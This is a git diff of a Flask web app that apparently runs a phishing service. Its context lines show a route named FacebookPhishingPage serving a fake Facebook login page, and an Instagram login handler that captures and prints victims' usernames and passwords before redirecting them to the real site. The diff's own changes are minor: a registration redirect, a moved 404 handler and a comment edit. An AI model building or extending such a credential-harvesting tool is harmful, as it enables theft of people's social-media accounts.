@@ -1,4 +1,4 @@
-from flask import Flask,render_template,request,redirect,session
+from flask import Flask,render_template,request,redirect,session,flash
 import DBHelper as dbh
 
 app = Flask(__name__)
@@ -28,7 +28,8 @@ def register():
             pas=request.form.get("psw")
             print(uid,email,pas)
             dbh.insertIntoUser(uid,email,pas)
-            return redirect("login")
+            session['user']=uid
+            return redirect("/")
         else:
             return render_template("register.html",userAlreadyExists=True)
         
@@ -92,12 +93,8 @@ def dashboard():
 
 
 
+
 #completed
-@app.errorhandler(404)
-def page_not_found(error):
-    return render_template('page_not_found.html'), 404
-
-
 @app.route('/contactus',methods=['GET','POST'])
 def contactus():
     if request.method=='POST':
@@ -111,6 +108,15 @@ def contactus():
         dbh.saveFeedback(uid,name,email,msg)
         return redirect('/')
     return render_template('contactus.html')
+
+
+
+
+
+#completed
+@app.errorhandler(404)
+def page_not_found(error):
+    return render_template('page_not_found.html'), 404
 
 
 
@@ -144,7 +150,7 @@ def loginInsta():
         print(owner,site,uid,pas)
     return redirect("https://instagram.com")
 
-#........INSTAGRAM END.......
+#..........END.......
 
 
 
@@ -161,7 +167,6 @@ def FacebookPhishingPage(userid):
     if dbh.checkIfUserExists(userid):
         return render_template("apps/facebook.html",uid=userid)
     return render_template('page_not_found.html')
-
 
 #completed
 @app.route("/loginFacebook",methods=['POST'])
